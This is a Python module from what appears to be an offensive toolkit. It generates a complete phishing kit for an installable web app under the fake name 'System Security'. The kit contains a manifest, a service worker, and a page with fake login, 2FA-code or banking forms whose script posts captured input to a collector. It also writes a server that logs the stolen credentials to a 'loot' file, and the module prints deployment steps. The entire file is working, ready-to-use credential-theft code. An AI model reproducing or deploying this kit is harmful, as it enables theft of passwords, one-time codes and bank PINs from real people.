"""
ShadowFramework — WebAPK Phisher
Generates realistic PWA (Progressive Web App) manifests and service workers for phishing.
"""
import os
import json
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()


class Module:
    MODULE_INFO = {
        'name': 'post/android/webapk_phisher',
        'description': 'Generates PWA/WebAPK phishing kit: manifest, service worker, install page.',
        'options': {
            'APP_NAME': 'Fake app name [default: System Security]',
            'DOMAIN':   'Hosting domain [default: secure-update.app]',
            'ICON_URL': 'App icon path [default: /icon.png]',
            'TARGET':   'What to phish: login, 2fa, banking [default: login]',
            'OUTPUT':   'Output directory [default: www/webapk]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        name = self.framework.options.get('APP_NAME', 'System Security')
        domain = self.framework.options.get('DOMAIN', 'secure-update.app')
        icon = self.framework.options.get('ICON_URL', '/icon.png')
        target = self.framework.options.get('TARGET', 'login').lower()
        output = self.framework.options.get('OUTPUT', 'www/webapk')

        console.print(f"[cyan][*] Generating WebAPK phishing kit: '{name}'[/cyan]")
        log_action(f"WebAPK phishing: {name} on {domain}")

        out_dir = Path(output)
        out_dir.mkdir(parents=True, exist_ok=True)

        # 1. Manifest
        manifest = {
            "short_name": name,
            "name": name,
            "icons": [
                {"src": icon, "type": "image/png", "sizes": "192x192"},
                {"src": icon, "type": "image/png", "sizes": "512x512", "purpose": "maskable"}
            ],
            "start_url": f"https://{domain}/",
            "background_color": "#ffffff",
            "display": "standalone",
            "scope": f"https://{domain}/",
            "theme_color": "#1a73e8",
            "description": "Protect your device with the latest security features.",
            "prefer_related_applications": False,
        }
        (out_dir / 'manifest.json').write_text(json.dumps(manifest, indent=2))

        # 2. Service Worker (caching + offline)
        sw = '''
const CACHE = 'shadow-v1';
const URLS = ['/', '/index.html', '/style.css'];
self.addEventListener('install', e => e.waitUntil(caches.open(CACHE).then(c => c.addAll(URLS))));
self.addEventListener('fetch', e => {
    e.respondWith(caches.match(e.request).then(r => r || fetch(e.request)));
});
'''
        (out_dir / 'sw.js').write_text(sw.strip())

        # 3. Main page with install prompt and phishing form
        form_html = {
            'login': '''<input type="email" placeholder="Email" required><input type="password" placeholder="Password" required><button type="submit">Sign In</button>''',
            '2fa': '''<p style="margin-bottom:16px;color:#666">Enter the verification code sent to your phone</p><input type="text" placeholder="6-digit code" maxlength="6" pattern="[0-9]{6}" style="text-align:center;font-size:24px;letter-spacing:8px" required><button type="submit">Verify</button>''',
            'banking': '''<input type="text" placeholder="Account Number" required><input type="password" placeholder="PIN" required><input type="text" placeholder="OTP Code" maxlength="6"><button type="submit" style="background:#1a237e">Confirm</button>''',
        }.get(target, '')

        index = f'''<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#1a73e8">
<meta name="apple-mobile-web-app-capable" content="yes">
<title>{name}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center}}
.card{{background:white;border-radius:20px;padding:36px;width:90%;max-width:380px;box-shadow:0 2px 12px rgba(0,0,0,.08)}}
h2{{text-align:center;color:#202124;margin-bottom:8px;font-size:22px}}
p.sub{{text-align:center;color:#5f6368;font-size:14px;margin-bottom:24px}}
input{{width:100%;padding:14px;margin:6px 0;border:1px solid #dadce0;border-radius:8px;font-size:15px}}
input:focus{{border-color:#1a73e8;outline:none}}
button{{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:12px}}
.install-banner{{position:fixed;bottom:0;left:0;right:0;background:white;padding:16px;box-shadow:0 -2px 8px rgba(0,0,0,.1);display:none;text-align:center}}
.install-btn{{background:#01875f;color:white;padding:12px 32px;border:none;border-radius:24px;font-size:15px;cursor:pointer}}
</style></head><body>
<div class="card">
<h2>{name}</h2><p class="sub">Verification required</p>
<form onsubmit="return steal(this)">
{form_html}
</form></div>
<div class="install-banner" id="ib"><p style="margin-bottom:8px;font-size:14px">Add to Home Screen for instant access</p><button class="install-btn" id="install">Install App</button></div>
<script>
if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js');
let dp;window.addEventListener('beforeinstallprompt',e=>{{e.preventDefault();dp=e;document.getElementById('ib').style.display='block';}});
document.getElementById('install').onclick=()=>{{if(dp)dp.prompt();}};
function steal(f){{
  var d={{}};new FormData(f).forEach((v,k)=>d[k]=v);d.ts=Date.now();d.app='{name}';
  navigator.sendBeacon('/collect',JSON.stringify(d));
  f.innerHTML='<div style="text-align:center;padding:20px"><p style="font-size:18px">✓</p><p style="color:#666;margin-top:8px">Verified</p></div>';
  return false;
}}
</script></body></html>'''
        (out_dir / 'index.html').write_text(index)

        # 4. Collector endpoint (simple Python server)
        collector = '''#!/usr/bin/env python3
"""Credential collection server for WebAPK phishing."""
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json, os, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8443

class Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/collect':
            data = self.rfile.read(int(self.headers['Content-Length']))
            creds = json.loads(data)
            print(f"\\n[+] CAPTURED: {json.dumps(creds, indent=2)}")
            os.makedirs('loot', exist_ok=True)
            with open('loot/webapk_creds.json', 'a') as f:
                f.write(json.dumps(creds) + '\\n')
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

print(f"[*] WebAPK phishing server on :{PORT}")
HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()
'''
        (out_dir / 'server.py').write_text(collector)

        console.print(f"[green][+] Files generated in {out_dir}/:[/green]")
        console.print(f"    manifest.json — PWA manifest")
        console.print(f"    sw.js — Service worker (offline caching)")
        console.print(f"    index.html — Phishing page ({target})")
        console.print(f"    server.py — Credential collector")
        console.print(f"\n[dim]Deploy: cd {out_dir} && python3 server.py 8443[/dim]")
        console.print(f"[dim]The page will prompt 'Add to Home Screen' on Chrome.[/dim]")
        console.print(f"[bold green][+] WebAPK phishing kit ready.[/bold green]")
